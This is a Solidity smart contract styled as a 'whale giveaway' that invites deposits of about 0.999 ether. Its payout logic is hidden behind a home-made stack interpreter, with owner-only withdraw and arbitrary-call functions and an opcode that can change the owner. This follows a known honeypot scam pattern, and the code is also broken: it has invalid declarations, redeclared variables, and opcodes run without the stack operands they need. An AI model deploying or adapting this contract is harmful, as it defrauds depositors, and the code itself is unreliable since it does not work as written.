pragma solidity ^0.4.19;

contract ObfuscatedWhaleGiveaway {
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 

    enum Instruction { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, TRANSFER, SETOWNER, CHECKOWNER }
    
    struct VM {
        uint256[] stack;
        uint256 pc;
        mapping(uint256 => uint256) memory;
    }
    
    modifier onlyOwner() {
        require(msg.sender == Owner);
        _;
    }

    function execute(uint256[] instructions) internal {
        VM memory vm;
        vm.pc = 0;
        while (vm.pc < instructions.length) {
            Instruction instr = Instruction(instructions[vm.pc]);
            vm.pc++;
            if (instr == Instruction.PUSH) {
                vm.stack.push(instructions[vm.pc]);
                vm.pc++;
            } else if (instr == Instruction.POP) {
                vm.stack.length--;
            } else if (instr == Instruction.ADD) {
                uint256 a = vm.stack[vm.stack.length - 1];
                uint256 b = vm.stack[vm.stack.length - 2];
                vm.stack.length--;
                vm.stack[vm.stack.length - 1] = a + b;
            } else if (instr == Instruction.SUB) {
                uint256 a = vm.stack[vm.stack.length - 1];
                uint256 b = vm.stack[vm.stack.length - 2];
                vm.stack.length--;
                vm.stack[vm.stack.length - 1] = a - b;
            } else if (instr == Instruction.JMP) {
                vm.pc = instructions[vm.pc];
            } else if (instr == Instruction.JZ) {
                if (vm.stack[vm.stack.length - 1] == 0) {
                    vm.pc = instructions[vm.pc];
                } else {
                    vm.pc++;
                }
                vm.stack.length--;
            } else if (instr == Instruction.LOAD) {
                vm.stack.push(vm.memory[instructions[vm.pc]]);
                vm.pc++;
            } else if (instr == Instruction.STORE) {
                vm.memory[instructions[vm.pc]] = vm.stack[vm.stack.length - 1];
                vm.pc++;
                vm.stack.length--;
            } else if (instr == Instruction.CALL) {
                address adr = address(vm.stack[vm.stack.length - 1]);
                bytes memory data = abi.encodePacked(vm.stack[vm.stack.length - 2]);
                adr.call.value(msg.value)(data);
                vm.stack.length -= 2;
            } else if (instr == Instruction.TRANSFER) {
                address adr = address(vm.stack[vm.stack.length - 1]);
                adr.transfer(vm.stack[vm.stack.length - 2]);
                vm.stack.length -= 2;
            } else if (instr == Instruction.SETOWNER) {
                Owner = address(vm.stack[vm.stack.length - 1]);
                vm.stack.length--;
            } else if (instr == Instruction.CHECKOWNER) {
                if (msg.sender != Owner) {
                    revert();
                }
            }
        }
    }

    function() public payable {}

    function redeem() public payable {
        uint256[] memory instructions = new uint256[](10);
        instructions[0] = uint256(Instruction.PUSH);
        instructions[1] = msg.value;
        instructions[2] = uint256(Instruction.PUSH);
        instructions[3] = minEligibility;
        instructions[4] = uint256(Instruction.SUB);
        instructions[5] = uint256(Instruction.JZ);
        instructions[6] = 9; // jump to end if not eligible
        instructions[7] = uint256(Instruction.TRANSFER);
        instructions[8] = uint256(Instruction.TRANSFER);
        execute(instructions);
    }

    function withdraw() public payable onlyOwner {
        uint256[] memory instructions = new uint256[](4);
        instructions[0] = uint256(Instruction.CHECKOWNER);
        instructions[1] = uint256(Instruction.PUSH);
        instructions[2] = uint256(this.balance);
        instructions[3] = uint256(Instruction.TRANSFER);
        execute(instructions);
    }

    function Command(address adr, bytes data) public payable onlyOwner {
        uint256[] memory instructions = new uint256[](4);
        instructions[0] = uint256(Instruction.PUSH);
        instructions[1] = uint256(adr);
        instructions[2] = uint256(Instruction.PUSH);
        instructions[3] = uint256(data.length);
        execute(instructions);
    }
}